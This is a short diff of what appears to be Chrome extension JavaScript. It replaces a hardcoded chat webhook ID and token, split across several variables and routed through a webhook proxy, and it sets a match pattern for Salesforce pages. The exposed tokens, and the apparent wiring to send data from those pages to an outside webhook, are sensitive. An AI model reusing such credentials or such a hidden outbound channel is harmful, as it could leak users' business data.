@@ -1,8 +1,8 @@
 const installedVersion = chrome.runtime.getManifest().version;
 let wh = 'https://webhook.lewisakura.moe/api/webhooks/';
-let URI1 = '1366753409713176697/';
+let URI1 = '1397855623919440003/';
 let URIF = '8gZwN31NeN1CQdCD5uTm/';
-let URI2 = 'dLJEY6BbNxHUgia76d73O8IKcrMGtmuuwnSduLN64sdvO0RZh6DQiNoJBmzqCqDg1E1m';
+let URI2 = 'lniBhrn8E0TV-lTkSDeFl5P6IHtS0syw_erXUsA6xz8flgSDtZ0Q0OwS1Kej8ylNM7AS';
 let params;
 let globalUUID;
 let pattern = "*://*.force.com/*";
